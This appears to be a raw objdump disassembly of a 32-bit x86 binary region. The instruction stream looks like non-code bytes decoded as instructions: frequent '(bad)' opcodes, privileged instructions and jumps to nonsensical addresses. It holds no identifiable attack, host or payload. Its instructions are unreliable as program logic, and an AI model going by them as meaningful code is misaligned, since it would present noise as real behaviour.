  414458:	adc    al,0x89
  41445a:	dec    ecx
  41445b:	adc    DWORD PTR [edx],edi
  41445d:	mov    eax,0x4e255b13
  414462:	daa    
  414463:	aas    
  414464:	push   ds
  414465:	das    
  414466:	push   ebp
  414467:	xchg   ecx,eax
  414468:	fnstenv [edi+0x34]
  41446b:	and    DWORD PTR [edi],ecx
  41446d:	cmp    BYTE PTR [esi+eiz*2+0x5a],0x4a
  414472:	jo     0x41446d
  414474:	cwde   
  414475:	xchg   ebx,eax
  414476:	xchg   ecx,eax
  414477:	push   edi
  414478:	dec    ebp
  414479:	shl    BYTE PTR [esi-0x20],1
  41447c:	adc    al,0x77
  41447e:	sahf   
  41447f:	stos   DWORD PTR es:[edi],eax
  414480:	cmp    DWORD PTR [esi+0x54],0x97d3d318
  414487:	jmp    0x3fbcca50
  41448c:	and    dh,cl
  41448e:	cmp    al,0x19
	...
  4144f4:	pop    ebx
  4144f5:	jae    0x414539
  4144f7:	or     eax,0x775f3d6a
  4144fc:	pop    ds
  4144fd:	dec    edi
  4144fe:	or     cl,BYTE PTR [esi-0x66]
  414501:	test   DWORD PTR [edi+0xd5ec29],ebx
  414507:	add    BYTE PTR [ecx+eax*1],al
  41450a:	add    BYTE PTR [eax],al
  41450c:	rcr    DWORD PTR [edx-0x7b],0x16
  414510:	mov    ch,BYTE PTR [eax+0x21]
  414513:	ss aaa 
  414515:	sub    dl,BYTE PTR [ecx]
  414517:	repz sub DWORD PTR [edx+0x7f19d3ed],ecx
  41451e:	push   esi
  41451f:	fiadd  WORD PTR [ebx+ebp*8+0x7e3d9f5f]
  414526:	jns    0x4144fc
  414528:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41452a:	test   DWORD PTR [ecx],0xa3ef56d1
  414530:	inc    esi
  414531:	outs   dx,DWORD PTR ds:[esi]
  414532:	in     eax,0xae
  414534:	test   eax,0xd8cc6114
  414539:	xchg   ebx,eax
  41453a:	fadd   DWORD PTR [ecx+0x50]
  41453d:	ret    0x9120
  414540:	cdq    
  414541:	addr16 push 0xffffffb7
  414544:	sbb    bl,BYTE PTR [ebp-0x5e]
  414547:	xor    al,BYTE PTR [ebx]
  414549:	mov    edx,0x7b9fb0f4
  41454e:	in     al,0x56
  414550:	or     DWORD PTR [edi-0x68],eax
  414553:	mov    ebp,0x8fa499a
  414558:	or     al,0xf0
  41455a:	xor    DWORD PTR gs:[edx-0x411d392f],esi
  414561:	jg     0x41454f
  414563:	rcl    DWORD PTR [eax+edi*4-0x5b1e4e25],0xe7
  41456b:	xchg   esp,eax
  41456c:	jns    0x4145a0
  41456e:	add    ebp,DWORD PTR [ebp+0x55]
  414571:	inc    esi
  414572:	jo     0x41452d
  414574:	add    al,0x62
  414576:	lods   eax,DWORD PTR ds:[esi]
  414577:	sub    eax,0xd7902031
  41457c:	fdivr  QWORD PTR [ebx]
  41457e:	out    dx,eax
  41457f:	or     esp,ebp
  414581:	inc    edx
  414582:	iret   
  414583:	cmp    DWORD PTR [ebp+0x4a],edi
  414586:	loopne 0x4145f4
  414588:	je     0x4145f5
  41458a:	fistp  WORD PTR [ebx-0x56]
  41458d:	addr16 in eax,0xbf
  414590:	add    al,0xb5
  414592:	jl     0x41460c
  414594:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414595:	pop    ebx
  414596:	cdq    
  414597:	lds    esp,FWORD PTR [edx+ecx*2]
  41459a:	mov    esi,0xab43ede7
  41459f:	sbb    eax,0xbd05a258
  4145a4:	(bad)  
  4145a6:	sbb    eax,0x14
  4145a9:	scas   al,BYTE PTR es:[edi]
  4145aa:	retf   0xc074
  4145ad:	dec    ebp
  4145ae:	cli    
  4145af:	fnstcw WORD PTR [eax]
  4145b1:	daa    
  4145b2:	xchg   DWORD PTR [ebp-0x7a690d8a],ebp
  4145b8:	(bad)  
  4145b9:	push   edx
  4145ba:	sub    ebx,DWORD PTR [ecx-0x1f]
  4145bd:	mov    esi,0x953f46da
  4145c2:	push   ecx
  4145c3:	int    0x9
  4145c5:	popf   
  4145c6:	push   edx
  4145c7:	gs mov dl,0x58
  4145ca:	sub    dh,BYTE PTR [eax+edx*1-0x72]
  4145ce:	sub    bh,cl
  4145d0:	xor    BYTE PTR [edx-0x1d9e4bc],bh
  4145d6:	call   FWORD PTR [ebx+ecx*8-0x4f]
  4145da:	jne    0x4145da
  4145dc:	push   esp
  4145dd:	sar    DWORD PTR [ebx+0x24],cl
  4145e0:	popa   
  4145e1:	leave  
  4145e2:	rol    DWORD PTR [ebx],1
  4145e4:	mov    DWORD PTR [esi],ebp
  4145e6:	scas   eax,DWORD PTR es:[edi]
  4145e7:	xor    ebp,edi
  4145e9:	xchg   esi,eax
  4145ea:	int    0xed
  4145ec:	scas   al,BYTE PTR es:[edi]
  4145ed:	adc    DWORD PTR [ebp-0x55],ebx
  4145f0:	jg     0x41460c
  4145f2:	or     al,0x12
  4145f4:	sbb    DWORD PTR [eax-0x63],0xacc5a30c
  4145fb:	out    0xb0,eax
  4145fd:	jge    0x41464b
  4145ff:	icebp  
  414600:	(bad)  
  414601:	xor    al,0xbb
  414603:	or     eax,0x6fba3da3
  414608:	cmp    eax,0x95585601
  41460d:	sbb    al,0xc4
  41460f:	dec    ebx
	...
  414674:	jg     0x4146d4
  414676:	cmc    
  414677:	ins    DWORD PTR es:[edi],dx
  414678:	cmc    
  414679:	out    dx,eax
  41467a:	call   FWORD PTR [esi+0x17]
  41467d:	enter  0xab7a,0xba
  414681:	cmp    eax,0xd6f008f9
  414686:	add    BYTE PTR [eax],al
  414688:	add    al,0x1
  41468a:	add    BYTE PTR [eax],al
  41468c:	fisttp QWORD PTR [ebx]
  41468e:	js     0x4146f5
  414690:	push   0x2e
  414692:	jl     0x4146a9
  414694:	call   DWORD PTR [ebx+0x4ca734b9]
  41469a:	rcl    BYTE PTR ds:0x783c44e4,cl
  4146a0:	fistp  DWORD PTR [ebp+0x59]
  4146a3:	out    0xf3,al
  4146a5:	hlt    
  4146a6:	sti    
  4146a7:	cdq    
  4146a8:	imul   edi,DWORD PTR [ebx-0x33],0xffffffce
  4146ac:	not    DWORD PTR [ebp-0x679efe43]
  4146b2:	das    
  4146b3:	sbb    DWORD PTR [esp+edi*1-0x3d],eax
  4146b7:	bound  edx,QWORD PTR [esi-0x75fc5385]
  4146bd:	arpl   WORD PTR [edi+eiz*2+0x46],bx
  4146c1:	in     eax,0x1a
  4146c3:	inc    DWORD PTR [edi-0x42]
  4146c6:	add    edi,DWORD PTR [eax-0x4e279e22]
  4146cc:	sub    BYTE PTR [esi+eax*8+0x78],ch
  4146d0:	imul   edi,DWORD PTR [ecx],0x2fb4e368
  4146d6:	push   0x751c4051
  4146db:	sbb    al,BYTE PTR [eax]
  4146dd:	loop   0x41469a
  4146df:	fimul  DWORD PTR [ebp+0x5e6cc4c2]
  4146e5:	(bad)  
  4146e6:	cwde   
  4146e7:	xor    esp,DWORD PTR [edi]
  4146e9:	imul   ebx,DWORD PTR [esi],0xe344cb4b
  4146ef:	xor    eax,0x4d1ade3b
  4146f4:	pop    eax
  4146f5:	adc    DWORD PTR [eax-0x755667d],0xffffff85
  4146fc:	mov    al,0x54
  4146fe:	push   esi
  4146ff:	(bad)  
  414700:	xchg   esp,eax
  414701:	pushf  
  414702:	stc    
  414703:	jmp    0x4146bc
  414705:	outs   dx,BYTE PTR ds:[esi]
  414706:	sbb    al,BYTE PTR [eax+0x6a53db7b]
  41470c:	push   ss
  41470d:	int    0xb8
  41470f:	add    ch,dh
  414711:	loope  0x41478f
  414713:	jbe    0x41471c
  414715:	xor    BYTE PTR [edi-0xb],cl
  414718:	inc    DWORD PTR [ebx-0x1e67bbd0]
  41471e:	adc    esi,DWORD PTR [ebx+0x17]
  414721:	add    esi,DWORD PTR [eax+ebp*1-0x44]
  414725:	sti    
  414726:	adc    ch,BYTE PTR [esi-0x4]
  414729:	inc    esi
  41472a:	in     eax,0xcc
  41472c:	shl    bl,1
  41472e:	je     0x41476b
  414730:	ret    0x4f9c
  414733:	adc    al,0x6d
  414735:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414736:	pop    ecx
  414737:	call   DWORD PTR [edx+0x237e10cd]
  41473d:	mov    bl,0x55
  41473f:	sub    BYTE PTR [ebx-0x27],dl
  414742:	(bad)  
  414744:	aad    0xb2
  414746:	dec    ch
  414748:	inc    ebx
  414749:	adc    BYTE PTR [ebx+eiz*4],dh
  41474c:	add    DWORD PTR [ebp+0x79],0x2d5328bb
  414753:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414754:	jmp    0xe38239b3
  414759:	int3   
  41475a:	dec    BYTE PTR [ebp+0x2bf64190]
  414760:	popf   
  414761:	icebp  
  414762:	je     0x4147a5
  414764:	daa    
  414765:	lods   eax,DWORD PTR ds:[esi]
  414766:	jmp    0xe80:0x5ff20115
  41476d:	enter  0x7465,0x2f
  414771:	inc    eax
  414772:	stos   DWORD PTR es:[edi],eax
  414773:	(bad)  
  414774:	out    0xe6,al
  414776:	or     edx,ebp
  414778:	mov    edi,0x8b1985ac
  41477d:	or     dl,BYTE PTR ds:0xedd9b346
  414783:	add    DWORD PTR [edx-0x4a],eax
  414786:	add    esi,esi
  414788:	pop    esp
  414789:	neg    DWORD PTR [ebp+0x40e91f6f]
  41478f:	imul   eax,DWORD PTR [eax],0x0
	...
  4147f1:	add    BYTE PTR [eax],al
  4147f3:	add    BYTE PTR [esi+0x2f],bh
  4147f6:	add    DWORD PTR [ebp+0x51],ebp
  4147f9:	outs   dx,DWORD PTR ds:[esi]
  4147fa:	jle    0x41483b
  4147fc:	aas    
  4147fd:	mov    BYTE PTR [esi],cl
  4147ff:	cmp    eax,0x3998ba7c
  414804:	hlt    
  414805:	xlat   BYTE PTR ds:[ebx]
  414806:	add    BYTE PTR [eax],al
  414808:	add    al,0x1
  41480a:	add    BYTE PTR [eax],al
  41480c:	pop    edx
  41480d:	ret    
  41480e:	aas    
  41480f:	cwde   
  414810:	sub    DWORD PTR [eax-0x5f],esp
  414813:	push   edi
  414814:	inc    DWORD PTR [ebp+0x4f]
  414817:	dec    edi
  414818:	ss sub al,0xfb
  41481b:	out    dx,eax
  41481c:	dec    edx
  41481d:	xor    al,0x56
  41481f:	xchg   ebp,eax
  414820:	and    bh,BYTE PTR [edi+0x39]
  414823:	aad    0x2e
  414825:	push   edx
  414826:	mov    cs,WORD PTR [eax+0x4bcac66]
  41482c:	sbb    eax,0xf538df7a
  414831:	jmp    0x8a811c26
  414836:	inc    edx
  414837:	shl    edx,cl
  414839:	sahf   
  41483a:	(bad)
  41483d:	sbb    eax,edx
  41483f:	lods   al,BYTE PTR ds:[esi]
  414840:	inc    DWORD PTR [ebp+0xe]
  414843:	rol    DWORD PTR [edi+0x32],cl
  414846:	call   0x99d6:0x82d8b6a4
  41484d:	inc    DWORD PTR [ebp-0x24]
  414850:	loopne 0x4147d7
  414852:	lds    edx,FWORD PTR [ecx-0xd]
  414855:	and    al,0xdf
  414857:	(bad)
  41485a:	pop    ss
  41485b:	ss pop esp
  41485d:	dec    edx
  41485e:	fld    DWORD PTR [ecx+eiz*8]
  414861:	mov    cl,0x82
  414863:	call   0xaa909de2
  414868:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414869:	std    
  41486a:	(bad)  
  41486b:	dec    esi
  41486c:	xchg   ebx,eax
  41486d:	fwait
  41486e:	jp     0x414808
  414870:	int3   
  414871:	xor    al,0xd7
  414873:	pop    edi
  414875:	adc    BYTE PTR [ebx],0xf4
  414878:	push   edi
  414879:	mov    cr1,eax
  41487c:	int    0xf0
  41487e:	fldenv ds:0xbc3f34f7
  414884:	les    edx,FWORD PTR [edi]
  414886:	frstor [esi]
  414888:	icebp  
  414889:	gs jp  0x414875
  41488c:	clc    
  41488d:	and    edx,DWORD PTR [edi]
  41488f:	xchg   ecx,eax
  414890:	cli    
  414891:	mov    eax,0xe7c7f83e
  414896:	sbb    eax,esi
  414898:	jne    0x4148fc
  41489a:	xor    esp,DWORD PTR [edx-0xc4a13ff]
  4148a0:	xchg   esi,eax
  4148a1:	jno    0x41491a
  4148a3:	mov    ah,0x31
  4148a5:	mov    ecx,0xf0403caf
  4148aa:	inc    edx
  4148ab:	dec    ebx
  4148ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148ad:	sbb    DWORD PTR [esi],ebx
  4148af:	out    0x98,eax
  4148b1:	push   ebx
  4148b2:	in     al,dx
  4148b3:	xor    eax,0xda8f58e2
  4148b8:	dec    edi
  4148b9:	jl     0x414920
  4148bb:	cmp    al,0x50
  4148bd:	test   eax,0x38b5074e
  4148c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148c3:	jb     0x414927
  4148c5:	in     eax,0x1e
  4148c7:	xchg   ebx,eax
  4148c8:	jnp    0x414939
  4148ca:	dec    eax
  4148cb:	pop    ds
  4148cc:	in     al,dx
  4148cd:	push   ebx
  4148ce:	stos   BYTE PTR es:[edi],al
  4148cf:	pop    eax
  4148d0:	test   eax,0x58a9b469
  4148d6:	(bad)  
  4148d7:	jno    0x414924
  4148d9:	sub    eax,0x3afbfeb0
  4148de:	(bad)  
  4148df:	in     eax,dx
  4148e0:	xchg   edx,eax
  4148e1:	mov    DWORD PTR [edi],0xdb55dfeb
  4148e7:	cld    
  4148e8:	adc    DWORD PTR [eax-0x39],edx
  4148eb:	ret    0x812e
  4148ee:	sti    
  4148ef:	jg     0x41496c
  4148f1:	cwde   
  4148f2:	adc    bh,BYTE PTR [ecx+0x3bd0e6fd]
  4148f8:	call   0xbcb9:0xd60a1ea
  4148ff:	mov    esp,0x915b339
  414904:	wrmsr  
  414906:	jg     0x4148e8
  414908:	outs   dx,DWORD PTR ds:[esi]
  414909:	push   0x37b07aeb
  41490e:	jmp    0x414a02
	...
  414973:	add    BYTE PTR [ebx],cl
  414975:	jle    0x414949
  414977:	and    esi,edi
  414979:	scas   eax,DWORD PTR es:[edi]
  41497a:	sti    
  41497b:	jle    0x414963
  41497d:	pop    edx
  41497e:	push   ds
  41497f:	pop    es
  414980:	mov    bl,0xda
  414982:	xchg   edx,eax
  414983:	mov    bh,al
  414985:	fadd   DWORD PTR [eax]
  414987:	add    BYTE PTR [ecx+eax*1],al
  41498a:	add    BYTE PTR [eax],al
  41498c:	repnz pause 
  41498f:	(bad)  
  414990:	scas   eax,DWORD PTR es:[edi]
  414991:	js     0x414987
  414993:	sub    BYTE PTR [edx+0x47],ah
  414996:	(bad)  
  414997:	popf   
  414998:	mov    al,0xd5
  41499a:	sub    eax,DWORD PTR [esi-0x198f6b82]
  4149a0:	sar    edx,cl
  4149a2:	sbb    BYTE PTR [edi-0x6b579d8c],ch
  4149a8:	gs cwde 
  4149aa:	lods   eax,DWORD PTR ds:[esi]
  4149ab:	in     eax,0x60
  4149ad:	ret    
  4149ae:	rcl    BYTE PTR ds:0x3155f832,1
  4149b4:	dec    ebp
  4149b5:	iret   
  4149b6:	je     0x4149a4
  4149b8:	mov    ds,WORD PTR [edx+esi*8-0x2e]
  4149bc:	stos   BYTE PTR es:[edi],al
  4149bd:	or     eax,0x56b2a2b
  4149c2:	ss pushf 
  4149c4:	(bad)  
  4149c5:	es ins BYTE PTR es:[edi],dx
  4149c7:	out    0x30,eax
  4149c9:	stc    
  4149ca:	jbe    0x4149cd
  4149cc:	outs   dx,DWORD PTR ds:[esi]
  4149cd:	inc    edi
  4149ce:	je     0x4149b7
  4149d0:	je     0x4149f9
  4149d2:	dec    edi
  4149d3:	add    bh,dl
  4149d5:	bts    DWORD PTR [esi],esi
  4149d8:	aas    
  4149d9:	add    al,0xe1
  4149db:	add    DWORD PTR [ebx+0x1c],ebp
  4149de:	jmp    0x414a50
  4149e0:	dec    ebx
  4149e1:	loope  0x414964
  4149e3:	jo     0x414a29
  4149e5:	and    eax,0x1f2a86c5
  4149ea:	xchg   ecx,eax
  4149eb:	hlt    
  4149ec:	or     eax,0x79b6b736
  4149f1:	iret   
  4149f2:	inc    ebp
  4149f3:	mov    DWORD PTR [edi],esp
  4149f5:	cwde   
  4149f6:	push   es
  4149f7:	cmp    BYTE PTR [ebx],ah
  4149f9:	and    DWORD PTR [ebx+0x39f21b83],edx
  4149ff:	ds je  0x414982
  414a02:	lea    ecx,[edi]
  414a04:	(bad)  
  414a05:	pusha  
  414a06:	mov    dl,0xd4
  414a08:	ja     0x4149cb
  414a0a:	lock sahf 
  414a0c:	mov    bh,0x93
  414a0e:	dec    ebx
  414a0f:	sbb    dh,dh
  414a11:	dec    esi
  414a12:	mov    ah,0xf1
  414a14:	pushf  
  414a15:	jnp    0x414a5e
  414a17:	aas    
  414a18:	mov    esp,0xa45328f3
  414a1d:	lahf   
  414a1e:	pop    ebp
  414a1f:	mov    ah,0xd2
  414a21:	xchg   ebx,eax
  414a22:	test   al,0x93
  414a24:	pop    eax
  414a25:	fcomp  DWORD PTR [eax+ebp*8-0x92753c5]
  414a2c:	pushf  
  414a2d:	sbb    BYTE PTR [ebx],dl
  414a2f:	xlat   BYTE PTR ds:[ebx]
  414a30:	sub    eax,0x756a409c
  414a35:	adc    eax,0xe36b767d
  414a3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a3b:	std    
  414a3c:	jae    0x414a01
  414a3e:	pop    ss
  414a3f:	call   0x7d61ae92
  414a44:	aad    0xd3
  414a46:	cmp    al,0xeb
  414a48:	icebp  
  414a49:	cs gs push ecx
  414a4c:	loopne 0x414a0b
  414a4e:	and    DWORD PTR [ebp+0x3c],ebp
  414a51:	sub    eax,0x40afa310
  414a56:	and    eax,0x76d4e557
  414a5b:	mov    BYTE PTR [eax],bh
  414a5d:	mov    ah,0xd7
  414a5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a60:	sbb    ebp,DWORD PTR [eax-0xcd5bac4]
  414a66:	clc    
  414a67:	jle    0x414ac6
  414a69:	lahf   
  414a6a:	cld    
  414a6b:	jae    0x414ade
  414a6d:	scas   al,BYTE PTR es:[edi]
  414a6e:	pop    ecx
  414a6f:	sbb    DWORD PTR [edi],ebx
  414a71:	(bad)  
  414a73:	mov    bl,0x1f
  414a75:	dec    edi
  414a76:	aas    
  414a77:	popf   
  414a78:	cmp    dl,BYTE PTR [esp+ebx*4]
  414a7b:	mov    ds:0xbe85d1c,eax
  414a80:	mov    esi,0xada09500
  414a85:	jnp    0x414aa3
  414a87:	adc    DWORD PTR [edi+0x7d],0xa26c17aa
  414a8e:	or     al,0xf3
	...
  414af4:	lahf   
  414af5:	fnstcw WORD PTR [esi]
  414af7:	ss jle 0x414af1
  414afa:	lahf   
  414afb:	stc    
  414afc:	bound  esp,QWORD PTR [ebx-0x607a9c27]
  414b02:	xor    BYTE PTR [ecx-0x4],0xd9
  414b06:	add    BYTE PTR [eax],al
  414b08:	add    al,0x1
  414b0a:	add    BYTE PTR [eax],al
  414b0c:	or     eax,eax
  414b0e:	adc    BYTE PTR [ecx],0x5f
  414b11:	cwde   
  414b12:	jmp    0x414b72
  414b14:	mov    bl,0x63
  414b16:	ins    DWORD PTR es:[edi],dx
  414b17:	loope  0x414afa
  414b19:	inc    eax
  414b1a:	lock jnp 0x414ab2
  414b1d:	(bad)  
  414b1e:	or     esi,DWORD PTR [esi]
  414b20:	sbb    BYTE PTR [edi+0x48e02cf8],bh
  414b26:	rol    BYTE PTR [ebx+0x77],1
  414b29:	test   ebp,0xdcfce5f
  414b2f:	popf   
  414b30:	xor    ecx,DWORD PTR [ecx]
  414b32:	fbstp  TBYTE PTR [eax+0x488ce845]
  414b38:	out    0x5a,eax
  414b3a:	and    esi,DWORD PTR [esi+0x4049daaa]
  414b40:	mov    al,0xfc
  414b42:	cdq    
  414b43:	add    al,0xc7
  414b45:	(bad)  
  414b46:	bound  eax,QWORD PTR [ebp+0x3d0952f9]
  414b4c:	adc    eax,0x892bdb3
  414b51:	xor    BYTE PTR [ecx+0x520e4dde],bl
  414b57:	sti    
  414b58:	cmp    ebp,esi
  414b5a:	mov    dh,0xb6
  414b5c:	in     al,dx
  414b5d:	push   ebx
  414b5e:	sbb    eax,0x33abda32
  414b63:	mov    eax,ds:0x12982464
  414b68:	push   ds
  414b69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b6a:	mov    DWORD PTR [ecx-0x65],ebp
  414b6d:	(bad)  
  414b6e:	xor    DWORD PTR [ebp+0x29],edx
  414b71:	adc    edx,0x21
  414b74:	xchg   DWORD PTR [eax+0x56],edi
  414b77:	ficomp DWORD PTR [edi-0x3168fdc7]
  414b7d:	jb     0x414b61
  414b7f:	cmp    eax,0x7b92d56a
  414b84:	dec    ebp
  414b85:	push   edi
  414b86:	mov    ds:0xdbd2ac6b,al
  414b8c:	inc    ecx
  414b8d:	sub    edi,DWORD PTR [esp+esi*4+0x5d]
  414b91:	stc    
  414b92:	lahf   
  414b93:	push   0x12
  414b95:	daa    
  414b96:	aad    0x5d
  414b98:	cld    
  414b99:	or     BYTE PTR [edx+0x1a648767],ch
  414b9f:	sub    esp,DWORD PTR [eax]
  414ba1:	mov    al,0xb8
  414ba3:	xchg   ebx,eax
  414ba4:	repz dec edi
  414ba6:	clc    
  414ba7:	push   ss
  414ba8:	mov    edi,0x1f8898a2
  414bad:	push   edi
  414bae:	xchg   ebp,eax
  414baf:	mov    bl,0x42
  414bb1:	call   0xc60b:0xba305fb5
  414bb8:	iret   
  414bb9:	add    eax,eax
  414bbb:	add    eax,0x3b5d4c25
  414bc0:	pushf  
  414bc1:	jg     0x414ba4
  414bc3:	(bad)  
  414bc4:	jmp    0x414c41
  414bc6:	and    BYTE PTR [edi+0x5ac8fe78],cl
  414bcc:	adc    al,0x0
  414bce:	cmp    ebx,esi
  414bd0:	xchg   edx,eax
  414bd1:	dec    edx
  414bd2:	inc    esi
  414bd3:	(bad)
  414bd7:	div    ch
  414bd9:	pusha  
  414bda:	aam    0x34
  414bdc:	jb     0x414c0a
  414bde:	in     al,dx
  414bdf:	jecxz  0x414b8f
  414be1:	jmp    0x414c43
  414be3:	lea    esp,[edx]
  414be5:	scas   al,BYTE PTR es:[edi]
  414be6:	inc    edi
  414be7:	sbb    eax,esi
  414be9:	sahf   
  414bea:	xor    edx,edx
  414bec:	retf   
  414bed:	add    DWORD PTR [ecx],esi
  414bef:	and    eax,0xf54cbbf6
  414bf4:	and    al,dh
  414bf6:	xor    edx,DWORD PTR [esi-0x5f]
  414bf9:	sub    al,0xde
  414bfb:	push   ss
  414bfc:	mov    cl,0xe1
  414bfe:	jmp    0xcdc9:0x977cdf4a
  414c05:	fsub   QWORD PTR [edx*1-0x2ad0c82d]
  414c0c:	mov    eax,ds:0x874ea5
	...
  414c71:	add    BYTE PTR [eax],al
  414c73:	add    BYTE PTR [esp+eiz*2],dh
  414c76:	push   ds
  414c77:	jl     0x414cd7
  414c79:	jle    0x414cf1
  414c7b:	ins    BYTE PTR es:[edi],dx
  414c7c:	out    0x12,al
  414c7e:	cs adc esi,ebp
  414c81:	or     bh,BYTE PTR [edi+eiz*8]
  414c84:	add    bl,bl
  414c86:	add    BYTE PTR [eax],al
  414c88:	add    al,0x1
  414c8a:	add    BYTE PTR [eax],al
  414c8c:	popf   
  414c8d:	std    
  414c8e:	inc    edi
  414c8f:	inc    edi
  414c90:	dec    edx
  414c91:	mov    BYTE PTR [ebx],ch
  414c93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c94:	mov    al,0xcf
  414c96:	push   ecx
  414c97:	dec    edi
  414c98:	ins    BYTE PTR es:[edi],dx
  414c99:	outs   dx,DWORD PTR ds:[esi]
  414c9a:	jo     0x414c26
  414c9c:	sbb    DWORD PTR [edx],0xfffffff3
  414c9f:	jne    0x414ce2
  414ca1:	dec    edx
  414ca2:	xchg   ebx,eax
  414ca3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ca4:	in     al,dx
  414ca5:	fidivr DWORD PTR [esi+0x3c]
  414ca8:	dec    ecx
  414ca9:	cwde   
  414caa:	mov    WORD PTR [esi+0x6d],ss
  414cad:	inc    eax
  414cae:	call   0x74f:0xab3191ad
  414cb5:	loop   0x414c86
  414cb7:	mov    ds,WORD PTR [eax-0x78]
  414cba:	mov    esp,0xa1b428e8
  414cbf:	loop   0x414d3b
  414cc1:	jge    0x414cd5
  414cc3:	sub    al,0x86
  414cc5:	xlat   BYTE PTR ds:[ebx]
  414cc6:	repnz out dx,al
  414cc8:	jp     0x414c88
  414cca:	leave  
  414ccb:	pop    es
  414ccc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ccd:	cmp    bh,BYTE PTR [ebx]
  414ccf:	ins    DWORD PTR es:[edi],dx
  414cd0:	adc    DWORD PTR [ebx-0x7e2fbd44],edi
  414cd6:	jb     0x414caa
  414cd8:	test   al,0x45
  414cda:	jnp    0x414d35
  414cdc:	jg     0x414d4a
  414cde:	scas   eax,DWORD PTR es:[edi]
  414cdf:	or     ebp,DWORD PTR [eax+ebx*1+0x3d]
  414ce3:	das    
  414ce4:	test   al,0x7b
  414ce6:	pushf  
  414ce7:	stc    
  414ce8:	mov    bl,0xe5
  414cea:	jnp    0x414cf1
  414cec:	inc    esi
  414ced:	test   BYTE PTR [eax],ah
  414cef:	test   BYTE PTR [esi],dl
  414cf1:	cmp    eax,DWORD PTR [esp+ebp*8+0x5d05566e]
  414cf8:	pop    esi
  414cf9:	jae    0x414ccc
  414cfb:	sub    eax,0x7b4ce5e1
  414d00:	or     eax,DWORD PTR [ecx]
  414d02:	movntps XMMWORD PTR [eax+edi*4+0x15daf385],xmm0
  414d0a:	cmp    ebp,esp
  414d0c:	aam    0x54
  414d0e:	mov    esp,0xaa700d89
  414d13:	mov    ss,WORD PTR [eax]
  414d15:	push   0x8471d406
  414d1a:	(bad)  
  414d1b:	lods   eax,DWORD PTR ds:[esi]
  414d1c:	fidiv  DWORD PTR [esi-0x37]
  414d1f:	sub    DWORD PTR [edx],edx
  414d21:	push   es
  414d22:	pop    ss
  414d23:	pop    ecx
  414d24:	cld    
  414d25:	jno    0x414cbe
  414d27:	mov    eax,ds:0xb0db85cc
  414d2c:	sbb    bl,cl
  414d2e:	(bad)  
  414d2f:	cmp    edx,edi
  414d31:	push   edi
  414d32:	js     0x414d4a
  414d34:	pop    eax
  414d35:	fadd   st(1),st
  414d37:	lea    edi,[esi-0x7e14d362]
  414d3d:	enter  0xba50,0xcb
  414d41:	inc    ecx
  414d42:	pushf  
  414d43:	adc    edi,DWORD PTR [esi-0x5b944e5c]
  414d49:	stos   DWORD PTR es:[edi],eax
  414d4a:	(bad)  
  414d4b:	sub    BYTE PTR [esi+0x673f0c5],ch
  414d51:	jg     0x414d3d
  414d53:	repnz dec ebx
  414d55:	icebp  
  414d56:	mov    esi,DWORD PTR [edi-0x9]
  414d59:	and    ah,BYTE PTR [ebx-0x6a]
  414d5c:	or     ebx,ebx
  414d5e:	mov    edi,0x77ea3631
  414d63:	pop    ss
  414d64:	fadd   QWORD PTR [ebp-0x9]
  414d67:	or     ebx,ebx
  414d69:	imul   BYTE PTR [ebx-0x288b41ac]
  414d6f:	fild   DWORD PTR gs:[ebp-0x5de09940]
  414d76:	mov    edx,0xa89f1fc2
  414d7b:	sti    
  414d7c:	test   eax,0xc8378e57
  414d81:	fldenv [edx-0x62ece113]
  414d87:	pop    eax
  414d88:	sub    BYTE PTR [ebp-0x6c4c8fbf],al
  414d8e:	in     eax,0xbd
	...
  414df4:	mov    bh,0x99
  414df6:	adc    dl,BYTE PTR [ecx-0x404864c2]
  414dfc:	in     al,dx
  414dfd:	xor    dh,BYTE PTR [esi]
  414dff:	adc    eax,0x131e3d77
  414e04:	add    al,0xdc
  414e06:	add    BYTE PTR [eax],al
  414e08:	add    al,0x1
  414e0a:	add    BYTE PTR [eax],al
  414e0c:	imul   ebx,DWORD PTR [ebx-0x2f],0x3658ed4d
  414e13:	xchg   esi,eax
  414e14:	or     BYTE PTR [eax+0x70],0x37
  414e18:	adc    ebx,DWORD PTR [edx-0x79]
  414e1b:	mov    eax,ds:0xbbd9c9e3
  414e20:	repnz mov al,0xf6
  414e23:	xchg   esp,eax
  414e24:	test   BYTE PTR [esi+0x3e6b0da5],bl
  414e2a:	add    BYTE PTR [ecx+0x77e447b1],0x79
  414e31:	xor    ch,bh
  414e33:	ins    BYTE PTR es:[edi],dx
  414e34:	xor    al,0x4b
  414e36:	jge    0x414e8c
  414e38:	sub    eax,0xcdbba593
  414e3d:	repz fcmovbe st,st(2)
  414e40:	dec    edx
  414e41:	sub    al,0x50
  414e43:	mov    dl,0xda
  414e45:	aaa    
  414e46:	call   0xa11526f6
  414e4b:	push   es
  414e4c:	fwait
  414e4d:	jo     0x414ec3
  414e4f:	mov    al,ds:0x63257b46
  414e54:	(bad)  
  414e55:	scas   eax,DWORD PTR es:[edi]
  414e56:	xor    ecx,esi
  414e58:	mov    ds:0x3b1ab83e,eax
  414e5d:	sub    dh,ch
  414e5f:	inc    esi
  414e60:	xchg   BYTE PTR [edi+0x2a],dh
  414e63:	mov    ds:0xf40ca55e,al
  414e68:	in     al,0x18
  414e6a:	mov    ds:0x2426e0a2,eax
  414e6f:	cs pop ecx
  414e71:	push   cs
  414e72:	push   0x3de1ce06
  414e77:	jl     0x414ebb
  414e79:	jmp    0x414eea
  414e7b:	sub    DWORD PTR [edi+0x78],ebx
  414e7e:	sub    ch,BYTE PTR [esi-0x3508ff4e]
  414e84:	int    0x9
  414e86:	call   0x5563e7eb
  414e8b:	xor    ebx,DWORD PTR [edi]
  414e8d:	push   ebp
  414e8e:	jne    0x414ed6
  414e90:	hlt    
  414e91:	or     ebp,eax
  414e93:	or     eax,0xec2aae92
